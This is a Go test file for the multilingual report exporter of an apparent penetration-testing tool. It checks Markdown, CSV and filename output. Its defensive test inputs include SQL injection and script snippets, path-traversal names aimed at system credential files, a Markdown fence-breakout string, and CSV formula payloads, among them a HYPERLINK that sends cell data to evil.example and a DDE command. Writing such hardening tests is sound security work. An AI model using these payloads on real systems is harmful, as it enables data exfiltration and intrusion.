package report

import (
	"bytes"
	"encoding/csv"
	"encoding/json"
	"path"
	"reflect"
	"strings"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/nexus-ia/nexus/db"
)

var genAt = time.Date(2026, 11, 2, 10, 30, 0, 0, time.UTC)

func node(t *testing.T, payload map[string]any) *db.Node {
	t.Helper()
	raw, err := json.Marshal(payload)
	if err != nil {
		t.Fatal(err)
	}
	return &db.Node{Payload: raw}
}

func mustContain(t *testing.T, out string, parts ...string) {
	t.Helper()
	for _, p := range parts {
		if !strings.Contains(out, p) {
			t.Errorf("output lacks %q:\n%s", p, out)
		}
	}
}

// mustOrder checks that each part appears after the previous one.
func mustOrder(t *testing.T, out string, parts ...string) {
	t.Helper()
	last := -1
	for _, p := range parts {
		i := strings.Index(out, p)
		if i < 0 {
			t.Fatalf("output lacks %q:\n%s", p, out)
		}
		if i < last {
			t.Fatalf("%q appears before the previous part:\n%s", p, out)
		}
		last = i
	}
}

func TestParseLang(t *testing.T) {
	for in, want := range map[string]Lang{
		"":                        ES,
		"es":                      ES,
		"EN":                      EN,
		"zh":                      ZH,
		"en-US,en;q=0.9":          EN,
		"zh-CN,zh;q=0.9,en;q=0.8": ZH,
		"fr-FR,es;q=0.8":          ES, // first supported wins
		"de-DE,de;q=0.9":          ES, // unsupported falls back to Spanish
		"pt":                      ES,
		" en ; q=1":               EN,
	} {
		if got := ParseLang(in); got != want {
			t.Errorf("ParseLang(%q) = %q, want %q", in, got, want)
		}
	}
	if Lang("xx").t() != catalog[ES] {
		t.Error("an unknown Lang must render Spanish")
	}
}

// Every language must define every string; a missing one would render as an
// empty heading or label.
func TestCatalogComplete(t *testing.T) {
	for lang, tx := range catalog {
		v := reflect.ValueOf(*tx)
		for i := 0; i < v.NumField(); i++ {
			if f := v.Field(i); f.Kind() == reflect.String && f.String() == "" {
				t.Errorf("%s: %s is empty", lang, v.Type().Field(i).Name)
			}
		}
		if len(tx.csvHeader) != 10 {
			t.Errorf("%s: CSV header has %d columns, want 10", lang, len(tx.csvHeader))
		}
		for _, s := range []string{"critical", "high", "medium", "low", "info"} {
			if tx.severities[s] == "" {
				t.Errorf("%s: no label for severity %s", lang, s)
			}
		}
		for _, s := range []string{db.FindingPending, db.FindingInProgress, db.FindingConfirmed, db.FindingResolved,
			db.FindingFixed, db.FindingFalsePositive, db.FindingIgnored, db.FindingDuplicate, db.FindingRiskAccepted} {
			if tx.statuses[s] == "" {
				t.Errorf("%s: no label for status %s", lang, s)
			}
		}
	}
}

func TestMarkdownSortsBySeverityAndDefaults(t *testing.T) {
	out := Markdown(Input{
		GeneratedAt: genAt,
		AssetCounts: map[string]int{"host": 2, "domain": 1},
		Findings: []*db.Node{
			node(t, map[string]any{"vulnclass": "info-leak", "severity": "low", "summary": "banner"}),
			node(t, map[string]any{"name": "SQLi", "severity": "critical", "evidence": map[string]any{"poc": "' OR 1=1--"}}),
			node(t, map[string]any{}),
			{Payload: []byte("not json")},
		},
	})
	mustContain(t, out,
		"# Informe de pruebas de penetración — Tarea sin nombre",
		"- **Objetivo**: (sin especificar)", "- **Generado**: 2026-11-02 10:30:00",
		"Hallazgos confirmados: **4**",
		"- Activos: domain 1, host 2", // asset types are sorted
		"**PoC / evidencia:**", "' OR 1=1--",
	)
	mustOrder(t, out, "### 1. [CRÍTICA] SQLi", "### 2. [BAJA] info-leak", "### 3. [INFORMATIVA] Sin clasificar", "### 4. [INFORMATIVA] Sin clasificar")
	if strings.Count(out, "PoC / evidencia") != 1 {
		t.Errorf("PoC block must appear only for findings that have one:\n%s", out)
	}
}

func TestMarkdownWithoutFindings(t *testing.T) {
	out := Markdown(Input{Title: "Acme", Goal: "web", GeneratedAt: genAt})
	mustContain(t, out, "# Informe de pruebas de penetración — Acme", "- **Objetivo**: web", "**0**", "_No se confirmaron vulnerabilidades._")
}

func TestMarkdownLanguages(t *testing.T) {
	in := Input{Title: "Acme", GeneratedAt: genAt, AssetCounts: map[string]int{"a": 1, "b": 2},
		Findings: []*db.Node{node(t, map[string]any{"name": "SQLi", "severity": "high"})}}
	in.Lang = EN
	mustContain(t, Markdown(in), "# Penetration test report — Acme", "- **Goal**: (not specified)", "Confirmed findings: **1**", "- Assets: a 1, b 2", "### 1. [HIGH] SQLi")
	in.Lang = ZH
	mustContain(t, Markdown(in), "# 渗透测试报告 — Acme", "- **任务目标**：（未指定）", "确认发现：**1** 个", "- 资产：a 1、b 2", "### 1. [高危] SQLi")
}

func TestFindingsMarkdownOrderCountsAndSections(t *testing.T) {
	old := genAt.Add(-time.Hour)
	in := []*db.DBFinding{
		{ID: 1, Name: "old high", Severity: "high", CreatedAt: old},
		{ID: 2, VulnClass: "xss", Severity: "medium", Status: "confirmed", TaskDescription: " Acme web ", CreatedAt: genAt,
			Summary: "reflected", Evidence: "GET /?q=<script>", Report: "## detail"},
		{ID: 3, Name: "new high", Severity: "high", CreatedAt: genAt},
		{ID: 4, Name: "crit", Severity: "critical", CreatedAt: old, Status: "weird_state"},
	}
	out := FindingsMarkdown(in, genAt, ES)

	if in[0].ID != 1 || in[3].ID != 4 {
		t.Fatal("FindingsMarkdown must not reorder the caller's slice")
	}
	mustContain(t, out,
		"# Informe consolidado de hallazgos",
		"- **Total de hallazgos**: 4",
		"| Severidad | Cantidad |",
		"| Crítica | 1 |", "| Alta | 2 |", "| Media | 1 |", "| Baja | 0 |",
		"- **Categoría**: xss", "- **Estado**: Confirmado", "- **Tarea**: Acme web",
		"- **Estado**: Pendiente",   // empty status defaults to pending
		"- **Estado**: weird_state", // unknown status is shown as stored
		"reflected", "**Evidencia:**", "GET /?q=<script>", "**Informe detallado:**\n\n## detail",
	)
	// Severity first, then newest first within a severity.
	mustOrder(t, out, "[CRÍTICA] crit", "[ALTA] new high", "[ALTA] old high", "[MEDIA] xss")

	en := FindingsMarkdown(in, genAt, EN)
	mustContain(t, en, "# Findings summary report", "- **Total findings**: 4", "| Critical | 1 |", "- **Status**: Confirmed", "[MEDIUM] xss")
	zh := FindingsMarkdown(in, genAt, ZH)
	mustContain(t, zh, "# 漏洞发现汇总报告", "- **发现总数**：4 个", "| 严重 | 1 |", "- **状态**：已确认", "**证据：**")
}

func TestFindingsMarkdownEmpty(t *testing.T) {
	out := FindingsMarkdown(nil, genAt, ES)
	mustContain(t, out, "- **Total de hallazgos**: 0", "| Crítica | 0 |", "_No hay hallazgos que coincidan._")
	if strings.Contains(out, "Detalle de hallazgos") {
		t.Error("empty export must not render a details section")
	}
}

func TestSingleFindingMarkdownTraffic(t *testing.T) {
	f := &db.DBFinding{
		ID: 7, Name: "IDOR", Severity: "high", CreatedAt: genAt,
		Report: "body", EvidenceVersion: 3, ReportEvidenceVersion: 2,
		TrafficBindings: []db.FindingTrafficBinding{{
			ID: 11, Role: "exploit", Note: "line1\nline2",
			Snapshot: db.TrafficEvidenceSnapshot{Method: "GET", URL: "https://t.example/a`b", Status: 200},
		}},
	}
	out := SingleFindingMarkdown(f, genAt, ES)
	mustContain(t, out,
		"# [ALTA] IDOR", "- **Severidad**: Alta", "## Informe detallado\n\nbody",
		"## Evidencia de tráfico asociada", "Versión de la evidencia: 3; vínculos: 1.",
		"La evidencia cambió", // report written for evidence v2, evidence is now v3
		"**Evidencia #11 · exploit** — `GET https://t.example/a%60b`, código 200",
		"   line1\n   line2",
		"[Solicitud](evidence/7/11/request.http) · [Respuesta](evidence/7/11/response.http)",
	)
	mustContain(t, SingleFindingMarkdown(f, genAt, EN), "# [HIGH] IDOR", "**Evidence #11 · exploit**", "[Request](evidence/7/11/request.http)")
	mustContain(t, SingleFindingMarkdown(f, genAt, ZH), "# [高危] IDOR", "证据已变更，详细报告待更新。", "，状态码 200")

	// The aggregated report has no attachments to link to.
	agg := FindingsMarkdown([]*db.DBFinding{f}, genAt, ES)
	mustContain(t, agg, "**Evidencia #11 · exploit**")
	if strings.Contains(agg, "request.http") {
		t.Error("aggregated report must not link to per-finding attachments")
	}
}

func TestTrafficSectionOmittedWhenNothingToSay(t *testing.T) {
	f := &db.DBFinding{ID: 1, Name: "x", Report: "r", EvidenceVersion: 2, ReportEvidenceVersion: 2}
	if out := SingleFindingMarkdown(f, genAt, ES); strings.Contains(out, "Evidencia de tráfico") {
		t.Errorf("no bindings and an up-to-date report must not render a traffic section:\n%s", out)
	}
}

// Evidence comes from the target under test, which may be hostile. A backtick
// run in it must not close the code block and let the target write report text.
func TestEvidenceCannotBreakOutOfCodeBlock(t *testing.T) {
	const injected = "## Sin hallazgos: el sistema es seguro"
	evidence := "HTTP/1.1 200 OK\n```\n" + injected + "\n```"
	f := &db.DBFinding{ID: 1, Name: "x", Severity: "high", CreatedAt: genAt, Evidence: evidence}
	n := node(t, map[string]any{"name": "x", "evidence": map[string]any{"poc": evidence}})

	for name, out := range map[string]string{
		"FindingsMarkdown":      FindingsMarkdown([]*db.DBFinding{f}, genAt, ES),
		"SingleFindingMarkdown": SingleFindingMarkdown(f, genAt, ES),
		"Markdown":              Markdown(Input{GeneratedAt: genAt, Findings: []*db.Node{n}}),
	} {
		t.Run(name, func(t *testing.T) {
			if !strings.Contains(out, evidence) {
				t.Fatalf("evidence must be kept verbatim:\n%s", out)
			}
			if !insideFence(out, injected) {
				t.Fatalf("evidence escaped its code block:\n%s", out)
			}
		})
	}
}

// insideFence reports whether the line equal to target sits inside a fenced
// code block, following CommonMark: a fence closes only with a run of at
// least as many backticks as opened it.
func insideFence(md, target string) bool {
	open := 0
	for _, line := range strings.Split(md, "\n") {
		run := len(line) - len(strings.TrimLeft(line, "`"))
		switch {
		case open == 0 && run >= 3:
			open = run
		case open > 0 && run >= open && strings.TrimSpace(line[run:]) == "":
			open = 0
		case line == target:
			return open > 0
		}
	}
	return false
}

func TestFindingFilenameIsSafe(t *testing.T) {
	cases := []struct {
		name string
		f    db.DBFinding
		lang Lang
		want string
	}{
		{"plain", db.DBFinding{ID: 123, Name: "SQL注入", Severity: "critical"}, ES, "critical_SQL注入__123.md"},
		{"defaults", db.DBFinding{ID: 5}, ES, "info_Sin_clasificar__5.md"},
		{"defaults en", db.DBFinding{ID: 5}, EN, "info_Uncategorized__5.md"},
		{"defaults zh", db.DBFinding{ID: 5}, ZH, "info_未分类__5.md"},
		{"class fallback", db.DBFinding{ID: 6, VulnClass: "rce", Severity: "high"}, ES, "high_rce__6.md"},
		{"traversal", db.DBFinding{ID: 9, Name: "../../etc/passwd", Severity: "low"}, ES, "low_.._.._etc_passwd__9.md"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := FindingFilename(&c.f, c.lang); got != c.want {
				t.Errorf("FindingFilename = %q, want %q", got, c.want)
			}
		})
	}

	hostile := []string{
		"../../../../root/.ssh/authorized_keys",
		`..\..\windows\system32`,
		"/etc/shadow",
		"a\x00b\nc\rd\te",
		"....",
		"",
		strings.Repeat("远程代码执行", 40),
		strings.Repeat("Ñ", 200),
	}
	for _, name := range hostile {
		got := FindingFilename(&db.DBFinding{ID: 42, Name: name, Severity: "high"}, ES)
		if !strings.HasSuffix(got, ".md") {
			t.Errorf("%q → %q: missing .md", name, got)
		}
		if strings.ContainsAny(got, "/\\\x00\n\r\t") || path.Base(got) != got {
			t.Errorf("%q → %q: unsafe zip entry name", name, got)
		}
		if !utf8.ValidString(got) {
			t.Errorf("%q → %q: truncation produced invalid UTF-8", name, got)
		}
		if len(got) > 123 {
			t.Errorf("%q → %q: %d bytes, want at most 120 plus .md", name, got, len(got))
		}
	}
}

func readCSV(t *testing.T, raw []byte) [][]string {
	t.Helper()
	if !bytes.HasPrefix(raw, []byte("\xEF\xBB\xBF")) {
		t.Fatal("CSV must start with a UTF-8 BOM so Excel reads it as UTF-8")
	}
	rows, err := csv.NewReader(bytes.NewReader(raw[3:])).ReadAll()
	if err != nil {
		t.Fatal(err)
	}
	return rows
}

func TestFindingsCSV(t *testing.T) {
	in := []*db.DBFinding{
		{ID: 2, Name: "low one", Severity: "low", CreatedAt: genAt, Summary: " s ", TaskDescription: "Acme, Inc."},
		{ID: 1, VulnClass: "sqli", Severity: "critical", CreatedAt: genAt, Report: "full report", Evidence: "big evidence",
			TrafficBindings: []db.FindingTrafficBinding{{ID: 10}, {ID: 11}}},
	}
	raw := FindingsCSV(in, ES)
	rows := readCSV(t, raw)
	if len(rows) != 3 || len(rows[0]) != 10 || rows[0][0] != "ID" || rows[0][3] != "Severidad" {
		t.Fatalf("unexpected shape: %q", rows)
	}
	crit, low := rows[1], rows[2]
	want := []string{"1", "sqli", "sqli", "Crítica", "Pendiente", "", "2026-11-02 10:30:00", "", "2", "10,11"}
	for i := range want {
		if crit[i] != want[i] {
			t.Errorf("critical row col %d = %q, want %q", i, crit[i], want[i])
		}
	}
	if low[0] != "2" || low[3] != "Baja" || low[5] != "Acme, Inc." || low[7] != "s" || low[8] != "0" || low[9] != "" {
		t.Errorf("low row = %q", low)
	}
	if bytes.Contains(raw, []byte("full report")) || bytes.Contains(raw, []byte("big evidence")) {
		t.Error("CSV must not carry the full report or evidence")
	}
	if en := readCSV(t, FindingsCSV(in, EN)); en[0][1] != "Name" || en[1][3] != "Critical" || en[1][4] != "Pending" {
		t.Errorf("English CSV = %q", en)
	}
	if zh := readCSV(t, FindingsCSV(in, ZH)); zh[0][1] != "名称" || zh[1][3] != "严重" {
		t.Errorf("Chinese CSV = %q", zh)
	}
}

// Finding names, summaries and task descriptions can carry text from the
// target. A cell that starts with a formula character runs as a formula when
// the client opens the CSV in a spreadsheet.
func TestFindingsCSVNeutralizesFormulas(t *testing.T) {
	payloads := []string{
		`=HYPERLINK("http://evil.example/?d="&A1,"x")`,
		"+cmd|' /C calc'!A0",
		"-2+3",
		"@SUM(1+1)",
		"\t=1+1",
		"\r=1+1",
	}
	for _, p := range payloads {
		rows := readCSV(t, FindingsCSV([]*db.DBFinding{{ID: 1, Name: p, VulnClass: p, Summary: p, TaskDescription: p, Severity: p, Status: p, CreatedAt: genAt}}, ES))
		for _, col := range []int{1, 2, 3, 4, 5, 7} {
			cell := rows[1][col]
			if cell == "" || strings.ContainsRune("=+-@\t\r", rune(cell[0])) {
				t.Errorf("payload %q: column %d = %q starts with a formula character", p, col, cell)
			}
			if !strings.Contains(cell, strings.TrimSpace(p)) {
				t.Errorf("payload %q: column %d = %q lost the original text", p, col, cell)
			}
		}
	}
}
